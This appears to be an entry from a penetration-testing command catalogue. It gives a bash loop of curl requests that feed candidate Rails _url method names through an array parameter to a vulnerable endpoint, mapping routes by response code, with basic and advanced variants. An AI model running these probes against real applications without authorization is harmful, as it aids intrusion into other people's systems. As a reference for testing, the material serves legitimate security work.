---
data: >-
  for method in dashboard_url profile_url secret_url; do curl -s -o /dev/null -w
  "%{http_code} %{url_effective}\n" -X GET
  "http://target.com/vulnerable?user_input[]=$method"; done
tags:
  - web
  - automation
  - probing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.450Z'
id: 29170ff9-1e81-4ac1-b46e-f0638783eaca
verified: false
validated: true
submitted: true
---
# curl-multiple-probes

## Command

```bash
for method in dashboard_url profile_url secret_url; do curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -X GET "http://target.com/vulnerable?user_input[]=$method"; done
```

## Description

Automates probing of multiple potential _url method names against a vulnerable Rails endpoint to map routes via response codes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for method in ...` | List of method names to test | Yes |
| `-s` | Silent mode | Yes |
| `-w "%{http_code} %{url_effective}"` | Custom output format | Yes |
| `-X GET` | Method | Yes |
| `?user_input[]=$method` | Dynamic array param | Yes |

## Examples

### Basic Usage

```bash
for m in user_url admin_url; do curl -s -w "%{http_code}\n" -X GET "http://target.com/vuln?input[]=$m"; done
```

### Advanced Usage

```bash
for m in $(cat methods.txt); do curl -s -w "Code: %{http_code} URL: %{url_effective}\n" -X GET "http://target.com/vuln?input[]=$m" >> results.txt; done
```

## Expected Output

Lines like "302 http://target.com/admin" for hits, "500 http://target.com/vulnerable" for misses.

## Related

- [[Related Procedure]]
